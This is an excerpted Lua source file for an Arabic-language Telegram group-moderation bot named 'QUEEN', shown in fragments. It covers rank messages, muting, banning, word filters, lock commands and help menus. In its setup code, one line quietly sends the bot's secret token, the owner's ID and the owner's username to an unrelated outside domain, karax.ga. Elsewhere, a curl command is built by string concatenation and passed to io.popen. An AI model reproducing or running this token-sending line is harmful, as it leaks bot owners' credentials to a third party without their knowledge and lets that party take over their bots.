...
SUDO = database:get(id_server..":SUDO:ID")
UserName = database:get(id_server..":SUDO:USERNAME")
https.request('http://karax.ga/QUEEN/?token='..token..'&id='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
create_config_auto()
file = io.open("QUEEN", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/QUEEN
token="]]..database:get(id_server..":token")..[["
...
local QUEEN_Msg = ''  
if msgs < 100 then 
QUEEN_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
QUEEN_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
QUEEN_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
QUEEN_Msg = 'متفاعل' 
elseif msgs < 1200 then 
QUEEN_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
QUEEN_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
QUEEN_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
QUEEN_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
QUEEN_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
QUEEN_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
QUEEN_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
QUEEN_Msg = 'امبروطور التفاعل☣️' 
elseif msgs < 10000000000 then 
QUEEN_Msg = 'رب التفاعل💖'  
end 
return QUEEN_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceQUEEN(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,QUEEN_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_,'📌¦ عدد المجموعات الان » { '..#group..' }'..QUEENk..''..QUEEN..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n۝¦ العضو » ['..result.title_..'](t.me/'..(username or 'ENGOYBOT')..')'
...
usertext = '\n۝¦ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ENGOYBOT')..')'
status  = '\n📫¦ تم ترقيته مطور في البوت'
...
local QUEEN_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if QUEEN_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..QUEEN_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/ENGOYBOT)}\n📛¦["..QUEEN_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/ENGOYBOT)}\n📛┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'۝¦ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ENGOYBOT')..') \n🔐¦ تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'۝¦ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ENGOYBOT')..') \n🔐¦ تـم قفـل التاك بالكتم ')  
end,nil)   
...
local UserName = (b.username_ or "QUEEN500k")
...
usertext = '\n۝¦ المستخدم » ['..result.title_..'](t.me/'..(username or 'ENGOYBOT')..')'
statusk  = '\n📫¦ تم طرده من هنا'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n۝¦ المستخدم » ['..data.first_name_..'](t.me/'..(data.username_ or 'ENGOYBOT')..')'
 statusk  = '\n📫¦ تم طرده من هنا'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n۝¦ المستخدم » '..userid..''
...
time = times * 60
local function Restricted(Kara,QUEEN)
if tonumber(QUEEN.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '\n⚠¦ عذرا لا تستطيع كتم ( '..Rutba(QUEEN.sender_user_id_,msg.chat_id_)..' )')
return false  
end
if Can_or_NotCan(QUEEN.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠¦ عذرا لا تستطيع كتم ( '..Rutba(QUEEN.sender_user_id_,msg.chat_id_)..' )')
else
MuteUser(msg.chat_id_,QUEEN.sender_user_id_,msg.date_+time)
local function name(kara,QUEEN)
if QUEEN.username_ == '' then name = QUEEN.first_name_ else name = QUEEN.username_ end
send(msg.chat_id_,msg.id_,"⚠ ¦ العضو《["..name.."](tg://user?id="..QUEEN.sender_user_id_..")》\nا┄─━━◉━━─┄\n⏳¦ تم كتم لمدة "..times.." دقايق ⏰")
end
getUser(QUEEN.sender_user_id_,name)
end
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n۝¦ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'QUEENSource')..')'
...
usertext = '\n۝¦ العضو » ['..result.title_..'](t.me/'..(username or 'QUEENSource')..')'
status  = '\n📥¦ تم الغاء حظره من هنا'
texts = usertext..status
else
texts = '⚠| لا يوجد حساب بهاذا المعرف'
...
t = "\n📌¦ قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do  
local QUEENSource_Msg = database:get(bot_id.."Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..''..k..'- '..v..' » {'..QUEENSource_Msg..'}\n'    
end  
if #list == 0 then  
...
if blakrt == 'مميز 🕵🏻‍♀️' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n۝¦ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'ENGOYBOT')..')'..'\n📬¦ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'كوين').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'كوين')
local QUEEN_Msg = {
'اسمي مينو كول💘؟',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..QUEEN_Msg[math.random(#QUEEN_Msg)]..']') 
return false
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'كوين').." غادر" or text == 'غادر' then  
...
☆ ┇ م5  ܀⠤܀ اوامر المنشئين
 ܀⠤⠤⠤⠤⠤⠤⠤⠤⠤܀   
[قناه السورسـﮯ](t.me/QUEENSource) 
܀܀܀܀܀܀܀܀܀
]]
send(msg.chat_id_, msg.id_,Text) 
return false
...
⚶ اوامر القفل و الفتح 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
❍ الاوامر كلها قفل + فتح
بالطرد / بالكتم / بالتقييد
܀⠤⠤⠤⠤⠤⠤⠤⠤܀
☆ ┇ التكرار           ◐↯ الاغاني
☆ ┇ السيلفي         ◐↯ الصوت
☆ ┇الماركـداون      ◐↯ الكيبورد
☆ ┇ المـلفات         ◐↯ الملصقات
☆ ┇ التوجيه         ◐↯ المتحركه 
☆ ┇الالـعاب           ◐↯ الشارحه
☆ ┇الصور             ◐↯ الفيديو
...
❍ تفعيل / تعطيل + الامر
܀⠤⠤⠤⠤⠤⠤⠤⠤܀
☆ ┇ التـرحيب       ◐↯الايدي بالصوره
☆ ┇ الرابط           ◐↯الالعاب
☆ ┇ ردود المدير    ◐↯اطردني
☆ ┇ ردود المطور   ◐↯صيح
☆ ┇ الايدي           ◐↯ضافني
☆ ┇ الرفــع           ◐↯ الحظر
☆ ┇ الــــــتـــــــفلـــــــيــــــــش
 ܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀   
❍  اوامر مختلفة 
 ܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
☆ ┇ تعين / مسح : الايدي
...
🔰┛ تنظيف الكروبات
~~~~~~~~~~~~~~~
༒¦ CH ➥ [قناه السورسـﮯ](t.me/QUEENSource)
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
...
file = download_to_file(url1,'QUEEN.webp')
print('TIMESSSS')
 local QUEEN = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. QUEEN .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'QUEEN.webp' .. '"'
io.popen(curl)
end
...
QUEEN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(QUEEN)
...
--------------------------------------------------------------------------------------------------------------
SourceQUEEN(data.message_,data)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local QUEENbot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if QUEENbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..QUEENbot.."] \n") 
